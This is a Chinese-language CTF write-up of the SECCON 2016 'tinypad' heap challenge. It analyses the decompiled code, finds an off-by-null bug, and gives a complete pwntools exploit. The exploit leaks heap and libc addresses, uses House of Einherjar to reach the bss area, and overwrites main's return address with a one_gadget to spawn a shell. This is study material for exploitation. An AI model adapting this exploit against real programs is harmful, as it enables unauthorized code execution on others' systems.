# 2016-seccon-tinypad

### 0x0 前置补偿

[house_of_einherjar.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/house_of_einherjar.c)

### 0x1 分析

看一下安全：

```shell
[*] '.tinypad'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

PIE没开真是个令人愉悦的事情。

拖进IDA之后，发现代码都放在`main()`函数里，~~假装不是菜单函数~~

首先~~一言不合~~就输出堆内信息：

```c
for ( i = 0; i <= 3; ++i )
    {
      LOBYTE(idx_show) = i + 49;
      writeln((__int64)"+------------------------------------------------------------------------------+\n", 0x51uLL);
      write_n((__int64)" #   INDEX: ", 0xCuLL);
      writeln((__int64)&idx_show, 1uLL);
      write_n((__int64)" # CONTENT: ", 0xCuLL);
      if ( *(_QWORD *)&tinypad[16 * (i + 16LL) + 8] )
      {
        len = strlen(*(const char **)&tinypad[16 * (i + 0x10LL) + 8]);
        writeln(*(_QWORD *)&tinypad[16 * (i + 0x10LL) + 8], len);
      }
      writeln((__int64)&LR, 1uLL);
    }
    idx = 0;
    choice = getcmd();
    v12 = choice;
```

然后主要是增加、删除、编辑三个部分：

增加：

```c
if ( choice != 'A' )
  goto defult;
while ( idx <= 3 && *(_QWORD *)&tinypad[16 * (idx + 0x10LL)] )
  ++idx;
if ( idx == 4 )
{
  writeln((__int64)"No space is left.", 0x11uLL);
}
else
{
  _size = -1;
  write_n((__int64)"(SIZE)>>> ", 0xAuLL);
  _size = read_int();
  if ( _size <= 0 )
  {
    size = 1;
  }
  else
  {
    size = _size;
    if ( (unsigned __int64)_size > 0x100 )
      size = 0x100;
  }
  _size = size;
  *(_QWORD *)&tinypad[16 * (idx + 16LL)] = size;
  *(_QWORD *)&tinypad[16 * (idx + 16LL) + 8] = malloc(_size);
  if ( !*(_QWORD *)&tinypad[16 * (idx + 16LL) + 8] )
  {
    writerrln((__int64)"[!] No memory is available.", 27LL);
    exit(-1);
  }
  write_n((__int64)"(CONTENT)>>> ", 0xDuLL);
  read_until(*(_QWORD *)&tinypad[16 * (idx + 16LL) + 8], _size, 10);
  writeln((__int64)"\nAdded.", 7uLL);
```

发现增加的时候，还是一个常规的结构体:

```c
struct ceil{
  long long size;
  void *chunk;
}
```

然后存在固定地址的`bss`段中。

这里倒是没什么毛病，主要是限制了堆块大小最大只有`0x100`。

因为`bss`段在存放`ceil`结构体之前预留了的空间只有`16 * 16 Byte`（在编辑部分可以理解为什么这么做。）

编辑部分：

```c
if ( choice != 'E' )
      {
        if ( choice == 'Q' )
          continue;
defult:
        writeln((__int64)"No such a command", 0x11uLL);
        continue;
      }
      write_n((__int64)"(INDEX)>>> ", 0xBuLL);
      idx = read_int();
      if ( idx > 0 && idx <= 4 )
      {
        if ( *(_QWORD *)&tinypad[16 * (idx - 1 + 0x10LL)] )
        {
          idx_show = '0';
          strcpy(tinypad, *(const char **)&tinypad[16 * (idx - 1 + 0x10LL) + 8]);// strcpy
          while ( toupper(idx_show) != 'Y' )
          {
            write_n((__int64)"CONTENT: ", 9uLL);
            v6 = strlen(tinypad);
            writeln((__int64)tinypad, v6);
            write_n((__int64)"(CONTENT)>>> ", 0xDuLL);
            edit_len = strlen(*(const char **)&tinypad[16 * (idx - 1 + 0x10LL) + 8]);
            read_until((__int64)tinypad, edit_len, 10);
            writeln((__int64)"Is it OK?", 9uLL);
            write_n((__int64)"(Y/n)>>> ", 9uLL);
            read_until((__int64)&idx_show, 1uLL, 10);
          }
          strcpy(*(char **)&tinypad[16 * (idx - 1 + 0x10LL) + 8], tinypad);// strcmp
          writeln((__int64)"\nEdited.", 8uLL);
        }
        else
        {
          writeln((__int64)"Not used", 8uLL);
        }
      }
      else
      {
        writeln((__int64)"Invalid index", 0xDuLL);
      }
    }
```

这里每次修改一次都会首先将内容存在存放`ceil`结构体的前`0x100`的空间，但是注意这里转存到`ceil->heap`的时候用的是`strcpy`函数，就会在最后加上一个`\x00`。存在`off bu null`可能。

删除部分：

```c
if ( choice == 'D' )
    {
      write_n((__int64)"(INDEX)>>> ", 0xBuLL);
      idx = read_int();
      if ( idx > 0 && idx <= 4 )                // idx start from 1
      {
        if ( *(_QWORD *)&tinypad[16 * (idx - 1 + 0x10LL)] )
        {
          free(*(void **)&tinypad[16 * (idx - 1 + 16LL) + 8]);
          *(_QWORD *)&tinypad[16 * (idx - 1 + 16LL)] = 0LL;
          writeln((__int64)"\nDeleted.", 9uLL);
        }
        else
        {
          writeln((__int64)"Not used", 8uLL);
        }
      }
      else
      {
        writeln((__int64)"Invalid index", 0xDuLL);
      }
    }
```

删除部分这里清空了`size`字段，但是`heap`指针没有置零，但是没有什么卵用，因为编辑函数检查的是`size`字段。

#### 思路

**首先**泄漏`libc`和`heapbase`地址。

我们可以通过两个fastbin范围的`chunk`来泄漏堆地址，然后用一个稍微大一点的`chunk`放到Unsorted bin里来泄漏`main_arena`地址，从而泄漏`libc`。

因为输出部分可不会检查`size`字段。

这里完成之后还是要把堆清到`top chunk`里的。

**然后**就可以house of einherjar来强行申请到`bss`段`tinypad`的内存了。

首先构造构造四个堆，用前两个堆来house of einherjar，然后用剩下的两个堆来调整数据。

```python
add(0x18, 'a' * 0x18)  # idx 0
add(0x100, 'b' * 0xf8 + '\x11')  # idx 1
add(0x100, 'c' * 0xf8)  # idx 2
add(0x100, 'd' * 0xf8)  #idx 3

tinypad_addr = 0x602040
fake_chunk = flat([
	p64(0),
	p64(0x101),
	p64(tinypad_addr + 0x20),
	p64(tinypad_addr + 0x20)
])
edit(3, 'd' * 0x20 + fake_chunk)

offset = heapbase + 0x20 - (tinypad_addr + 0x20)
print(hex(offset))
offset_strip = p64(offset).strip('\x00')
number_of_zeros = len(p64(offset)) - len(offset_strip)
for i in range(number_of_zeros + 1):
	data = offset_strip.rjust(0x18 - i, 'f')
	edit(1, data)
delete(2)
```

然后要申请这块空间就要先通过第四个`chunk`来调整`fake_chunk`来调整`fake_chunk`的`bk和fd`指针通过检查。

```python
payload = flat([
	'd' * 0x20,
	p64(0),
	p64(0x101),
	p64(main_arena + 88),
	p64(main_arena + 88)
])
edit(4, payload)
```

这里就万事大吉了。

**接下来**就通过可以控制`bss`段指向前两个`chunk`的指针修改任意地址了。

我们首先让第一个指针指向`__environ`地址，泄漏栈地址来得到`main`返回地址的位置方便修改，然后让第二个指针指向地址一个指针的地址。

这样下次修改就可以把第一个指针指向的地址改成`main`返回地址，然后修改这里为`gadget`。就可以拿到shell了。

这里之所以要用`__environ`，是因为经gdb调试后发现常规的`malloc_hook`地址那里由于`strlen`缘故没法编辑成`gadget`。

### 0x2 EXP

```python
#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *

p = process('./tinypad')
libc = ELF('libc.so.6')
elf = ELF('./tinypad')

main_arena_offset = 0x3c4b20

context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

def debug(cmd):
	gdb.attach(p, cmd)
	pause()

def add(size, content):
	p.recvuntil('(CMD)>>> ')
	p.sendline('A')
	p.recvuntil('(SIZE)>>> ')
	p.sendline(str(size))
	p.recvuntil('(CONTENT)>>> ')
	p.sendline(content)


def delete(index):
	p.recvuntil('(CMD)>>> ')
	p.sendline('D')
	p.recvuntil('(INDEX)>>> ')
	p.sendline(str(index))


def edit(index, content):
	p.recvuntil('(CMD)>>> ')
	p.sendline('E')
	p.recvuntil('(INDEX)>>> ')
	p.sendline(str(index))
	p.recvuntil('CONTENT: ')
	p.sendline(content)
	p.recvuntil('(Y/n)>>> ')
	p.sendline('Y')

#leak heap
add(0x70, 'a' * 8)  # idx 0
add(0x70, 'b' * 8)  # idx 1
add(0x100, 'c' * 8)  # idx 2

delete(2)	#idx 1
delete(1)	#idx 0
# debug('bin\n')
p.recvuntil('# CONTENT: ')
heapbase = u64(p.recvuntil('\n')[:-1].ljust(8, '\x00')) - 0x80
print (hex(heapbase))
# debug('bin\n')

#leak libc
delete(3)	#idx 2
p.recvuntil('# CONTENT: ')
main_arena = u64(p.recvuntil('\n')[:-1].ljust(8, '\x00')) - 88
base = main_arena- main_arena_offset
libc.address = base
print (hex(base))

#house of einherjar
add(0x18, 'a' * 0x18)  # idx 0
add(0x100, 'b' * 0xf8 + '\x11')  # idx 1
add(0x100, 'c' * 0xf8)  # idx 2
add(0x100, 'd' * 0xf8)  #idx 3

tinypad_addr = 0x602040
fake_chunk = flat([
	p64(0),
	p64(0x101),
	p64(tinypad_addr + 0x20),
	p64(tinypad_addr + 0x20)
])
edit(3, 'd' * 0x20 + fake_chunk)

offset = heapbase + 0x20 - (tinypad_addr + 0x20)
print(hex(offset))
offset_strip = p64(offset).strip('\x00')
number_of_zeros = len(p64(offset)) - len(offset_strip)
for i in range(number_of_zeros + 1):
	data = offset_strip.rjust(0x18 - i, 'f')
	edit(1, data)
delete(2)

payload = flat([
	'd' * 0x20,
	p64(0),
	p64(0x101),
	p64(main_arena + 88),
	p64(main_arena + 88)
])
edit(4, payload)
# debug('bin\n')

#change main return address
one_gadget_addr = base + 0x45216
environ_pointer = libc.sym['__environ']

fake_pad = flat([
	'f' * (0x100 - 0x20 - 0x10),
	'a' * 8,
	p64(environ_pointer),
	'a' * 8,
	p64(0x602148) #idx 0
])
add(0x100 - 0x8, fake_pad)	#idx 1
# debug('bin\n')

p.recvuntil('# CONTENT: ')
environ_addr = u64(p.recvuntil('\n')[:-1].ljust(8, '\x00'))
print(hex(environ_addr))
# debug('bin\n')

main_ret_addr = environ_addr - 0xf0
edit(2, p64(main_ret_addr))
edit(1, p64(one_gadget_addr))

p.recvuntil('>>>')
p.sendline('Q')
p.interactive()
```



